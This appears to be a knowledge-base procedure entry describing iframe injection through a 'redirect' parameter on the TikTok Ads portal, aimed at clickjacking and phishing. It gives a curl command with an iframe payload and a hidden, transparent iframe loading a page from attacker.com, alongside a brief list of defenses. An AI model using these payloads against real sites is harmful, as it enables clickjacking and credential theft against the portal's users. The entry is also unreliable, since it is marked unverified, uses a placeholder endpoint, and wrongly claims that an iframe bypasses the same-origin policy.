---
id: p3c4d5e6-f7g8-9012-cdef-3456789012
tags:
  - iframe-injection
  - bypass
  - web
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-iframe-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:39.349Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Iframe

## Summary

This procedure injects malicious iframes via the unsanitized 'redirect' parameter in the TikTok Ads portal, bypassing same-origin policy to load external content for clickjacking or additional exploitation.

## Description

By embedding HTML iframe tags in the redirect parameter, attackers can force the portal to render external malicious pages within its context. This enables attacks like UI redressing (clickjacking) or loading phishing forms, potentially leading to credential theft without direct JavaScript execution.

## Requirements

1. Vulnerable endpoint confirmed
2. Attacker-hosted malicious page (e.g., phishing site)
3. Browser environment for rendering

## Defense

Defensive measures and detection strategies:

- Strip or validate HTML tags in redirect parameters
- Enforce strict CSP to prevent iframe embedding from untrusted sources
- Log and alert on unusual HTML content in parameters

## Objectives

1. Load external content within the portal's page
2. Bypass SOP for cross-origin interactions
3. Enable secondary attacks like clickjacking

## Instructions

### Step 1: Test Iframe Injection

**Context**: Inject a basic iframe to verify embedding.

**Command** ([[commands/curl-iframe-payload]]):
```bash
curl -X GET "https://ads.tiktok.com/some-endpoint?redirect=<iframe src=\"https://example.com\"></iframe>" -v
```

> Response shows iframe tag reflected; in browser, external page loads inside the portal.

### Step 2: Deploy Malicious Iframe

**Context**: Use for clickjacking by overlaying transparent iframe.

**Command** (Advanced payload):

redirect=<iframe src="https://attacker.com/clickjack" style="opacity:0;position:absolute;">

> Render in browser; test for interaction with underlying elements.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-iframe-payload]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[iframe-injection]]
- [[bypass]]
